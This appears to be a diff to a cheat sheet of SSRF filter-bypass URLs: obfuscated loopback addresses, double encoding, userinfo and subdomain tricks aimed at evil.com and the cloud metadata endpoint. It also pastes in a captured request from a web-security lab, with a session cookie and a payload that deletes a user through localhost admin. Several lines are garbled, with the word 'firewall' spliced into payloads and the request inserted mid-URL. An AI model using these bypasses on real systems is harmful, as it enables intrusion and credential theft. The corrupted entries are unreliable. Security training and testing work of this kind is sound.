@@ -92,7 +92,7 @@ Representation,How It Works,Example URL
 Decimal - 2130706433 = 127.0.0.1
 Octal - 0177.0.0.1 or 017700000001
 Dotted decimal variants - "127.1, 127.0.1, 127.127.127.127"
-Hexadecimal - 0x7f.0x0.0x0.0x1 → 0x7f000001
+Hexadecimal - 0x7f.0x0.0x0.0x1 → 0x7f000001firewall
 Mixed formats,"Combine decimal, octal, hex",127.0.0.0177
 
 Test like this : 
@@ -201,7 +201,7 @@ https://evil.com/%2e%2e/%2e%2e/127.0.0.1
 https://127.0.0.1%3A80
 
 # 5) DOUBLE ENCODING TRICKS
-https://evil.com%2523expected-host
+https://evil.com%2523expectefirewalld-host
 https://evil.com%252F..%252F..%252F127.0.0.1
 https://127.0.0.1%253A80
 https://evil.com/%252e%252e/%252e%252e/127.0.0.1
@@ -256,7 +256,7 @@ https://expected-host:pwd@evil.com%2f..%2f127.0.0.1
 
 # 1) USERINFO (@) BYPASSES
 https://expected-host@evil.com
-https://expected-host:fakepass@evil.com
+https://expected-host:fakepafirewallss@evil.com
 https://expected-host:80@127.0.0.1
 https://expected-host:anypwd@169.254.169.254/latest/meta-data/
 https://expected-host:xyz@localhost
@@ -268,7 +268,27 @@ https://evil.com/path#expected-host.com
 https://internal.com/resource#expected-host
 
 # 3) DNS SUBDOMAIN TRICKS
-https://expected-host.evil.com
+https://expected-host.evil.comPOST /product/stock HTTP/2
+Host: 0a0f00df04c5b6be8689a35000a3001b.web-security-academy.net
+Cookie: session=kybtIIBTniWi4uCd9NZb8RZMKNLN4hoJ
+Content-Length: 88
+Sec-Ch-Ua-Platform: "Linux"
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"
+Content-Type: application/x-www-form-urlencoded
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Gpc: 1
+Accept-Language: en-GB,en;q=0.6
+Origin: https://0a0f00df04c5b6be8689a35000a3001b.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a0f00df04c5b6be8689a35000a3001b.web-security-academy.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+stockApi=http%3A%2F%2Flocalhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
 https://expected-host.com.evil.com
 https://expected-host.safe.evil.com
 https://expected-host.localhost.run
@@ -299,7 +319,7 @@ https://expected-host.evil.com/login  # -> Redirect to http://127.0.0.1
 
 # 8) IPV6 + OBFUSCATED IP
 http://[::1]/
-http://[::ffff:127.0.0.1]/
+http://[::ffff:127.0.0.1]/firewallfirewall
 http://2130706433/        # decimal 127.0.0.1
 http://0177.0.0.1/        # octal
 http://0x7f000001/        # hex
@@ -319,7 +339,7 @@ https://expected-host:fake@evil.expected-host.evil.com
 
 # fragment + encoding
 https://evil.com%23expected-host
-
+firewall
 # double encoding + IPv6
 http://[::ffff:127.0.0.1]%2523expected-host/
 
